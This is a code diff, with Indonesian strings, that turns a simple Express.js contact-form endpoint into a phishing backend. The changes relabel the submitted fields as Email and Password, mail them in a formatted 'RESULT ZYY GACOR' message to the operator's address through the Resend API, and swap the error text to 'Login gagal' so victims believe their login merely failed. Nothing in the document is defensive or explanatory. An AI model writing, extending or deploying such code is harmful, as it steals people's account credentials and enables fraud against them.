@@ -53,7 +53,7 @@ app.post("/api/pesan", async (req, res) => {
   const belakang = String(req.body.belakang || "").trim().slice(0, 80);
 
   if (!nama || !belakang) {
-    return res.status(400).json({ error: "Nama dan nama belakang wajib diisi." });
+    return res.status(400).json({ error: "Email dan Password wajib diisi." });
   }
 
   try {
@@ -64,11 +64,26 @@ app.post("/api/pesan", async (req, res) => {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        from: "onboarding@resend.dev",
-        to: TARGET_EMAIL,
-        subject: "Pesan baru",
-        text: `Format:\nNama: ${nama}\nNama belakang: ${belakang}`,
-      }),
+  from: "onboarding@resend.dev",
+  to: TARGET_EMAIL,
+  subject: "👑RESULT ZYY GACOR",
+  html: `
+    <div style="font-family:sans-serif;max-width:480px;margin:0 auto;padding:24px;background:#f4f5f8;border-radius:12px;">
+      <h2 style="color:#1b1e25;margin:0 0 16px;">Data Baru Masuk</h2>
+      <table style="width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;">
+        <tr>
+          <td style="padding:12px 16px;color:#7a8296;font-size:13px;border-bottom:1px solid #e3e6ee;">Email</td>
+          <td style="padding:12px 16px;color:#1b1e25;font-weight:600;border-bottom:1px solid #e3e6ee;">${nama}</td>
+        </tr>
+        <tr>
+          <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Password</td>
+          <td style="padding:12px 16px;color:#1b1e25;font-weight:600;">${belakang}</td>
+        </tr>
+      </table>
+      <p style="color:#7a8296;font-size:12px;margin-top:16px;">Dikirim otomatis dari form ladang</p>
+    </div>
+  `,
+}),
     });
 
     if (!r.ok) {
@@ -77,8 +92,8 @@ app.post("/api/pesan", async (req, res) => {
 
     res.json({ ok: true });
   } catch (e) {
-    console.error("Gagal kirim email:", e.message);
-    res.status(500).json({ error: "Gagal mengirim email." });
+    console.error("Login gagal:", e.message);
+    res.status(500).json({ error: "Login gagal" });
   }
 });
 
